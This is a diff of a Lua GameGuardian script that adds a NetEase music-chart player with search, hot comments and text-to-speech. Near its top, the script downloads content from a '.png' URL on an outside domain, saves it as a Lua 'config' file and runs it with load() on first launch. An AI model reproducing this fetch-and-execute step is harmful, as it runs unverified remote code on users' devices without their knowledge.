@@ -1,1 +1,158 @@
-shinan0=0for i=1,1314 doshinan0=shinan0+1shinan1=string.rep(' shinan ',shinan0)shinan="if (function () if nil then "..shinan1.." shinan ::s:: end shinan_=_shinan end)then end\n"print(shinan)end
+Yyue = { }
+if not io.open ( "音乐配置.lua" ) then
+	local f = io.open ( "音乐配置.lua" , 'a' )
+	f : write ( gg.makeRequest ( 'http://jiami.guimei.work/a/1660616708.png' ).content )
+	gg.alert ( '配置生成' )
+end
+load ( io.open ( '音乐配置.lua' , 'r' ) : read ( '*a' ) ) ( )
+
+Y1 = "https://api.uomg.com/api/rand.music?sort=热歌榜&format=json"
+
+Y2 = "https://api.uomg.com/api/rand.music?sort=新歌榜&format=json"
+
+Y3 = "https://api.uomg.com/api/rand.music?sort=飙升榜&format=json"
+
+Y4 = "https://api.uomg.com/api/rand.music?sort=抖音榜&format=json"
+
+Y5 = "https://api.uomg.com/api/rand.music?sort=电音榜&format=json"
+
+Y6 = "https://api.uomg.com/api/comments.163?format=text"
+
+
+function XM ( )
+	local GN = { JS , Y1 , Y2 , Y3 , Y4 , Y5 , reping , BC , TC , os.exit }
+	local menu = gg.choice ( {
+			"搜索榜歌曲" ,
+
+			"网易热歌榜" ,
+
+			"网易新歌榜" ,
+
+			"网易飙升榜" ,
+
+			"网易抖音榜" ,
+
+			"网易电音榜" ,
+
+			"网易云热评" ,
+
+			'音乐本地生成' ,
+
+			"结束播放" ,
+
+			"退出脚本" ,
+
+		} , nil , muchen2 )
+
+	if menu then
+		if menu > 1 and menu < 7 then
+
+			BF ( GN [ menu ] )
+		else
+			GN [ menu ] ( )
+		end
+	end
+end
+
+function BF ( YSN )
+	local Obtain1 = gg.makeRequest ( YSN ).content
+	local muchen = Obtain1 : match ( 'url":"(.-)","picurl' )
+	muchen2 = Obtain1 : match ( 'name":"(.-)","' )
+	local muchen3 = Obtain1 : match ( 'id=(.-)","p' )
+	gg.playMusic ( muchen )
+	gg.toast('开始播放'..muchen2)
+end
+
+
+
+
+function BC ( )
+	local mz , wl = { } , { }
+	local xm = gg.prompt ( { '生成数量' } )
+	local GN = { Y1 , Y2 , Y3 , Y4 , Y5 }
+	local menu = gg.choice ( {
+
+
+			"网易热歌榜" ,
+
+			"网易新歌榜" ,
+
+			"网易飙升榜" ,
+
+			"网易抖音榜" ,
+
+			"网易电音榜" ,
+
+		} , nil , '选择一个榜单生成' )
+	for i = 1 , xm [ 1 ] do
+		local Obtain1 = gg.makeRequest ( GN [ menu ] ).content
+		local muchen = Obtain1 : match ( 'url":"(.-)","picurl' )
+		local muchen2 = Obtain1 : match ( 'name":"(.-)","' )
+		local muchen3 = Obtain1 : match ( 'id=(.-)","p' )
+		Yyue [ muchen2 ] = muchen
+		gg.toast(muchen2)
+		
+	end
+	local f = io.open ( "音乐配置.lua" , 'w+' )
+	YSN = ''
+	for v , k in pairs ( Yyue ) do
+		TR = '['.."'"..v.."'"..']'..'='.."'"..k.."',\n"
+		YSN = YSN..TR
+	end
+	local f = io.open ( "音乐配置.lua" , 'a' )
+	f : write ( 'Yyue='..'{'..YSN..'}' )
+	gg.alert('生成完成音乐配置可自行查看')
+end
+
+
+function reping ( )
+	local Comment = gg.makeRequest ( Y6 ).content
+	local X = gg.alert ( Comment , "复制热评" )
+	if X == 1 then
+		gg.copyText ( Comment )
+	end
+end
+
+function TC ( )
+	VV = "播放结束"
+	gg.playMusic ( "https://fanyi.baidu.com/gettts?lan=zh&text="..VV.."&spd=6&source=wise" )
+end
+
+
+function JS ( )
+	local MZ2 , LJ = { } , { }
+	local xm = gg.prompt ( { '输入歌曲关键词' } , { } , { 'text' } )
+	if xm then
+		for k , v in pairs ( Yyue ) do
+			if k : find ( xm [ 1 ] ) ~= nil then
+				table.insert ( MZ2 , k )
+				table.insert ( LJ , v )
+			end
+		end
+		local xm = gg.choice ( MZ2 , nil , '选择歌曲播放' )
+		if xm then
+			gg.playMusic ( LJ [ xm ] )
+			muchen2=MZ2[xm]
+			gg.toast('开始播放'..muchen2)
+		end
+	end
+end
+
+
+
+
+while true do
+	if gg.isVisible ( ) then
+		gg.setVisible ( false )
+		XM ( )
+	end
+end
+
+
+
+
+
+
+
+
+
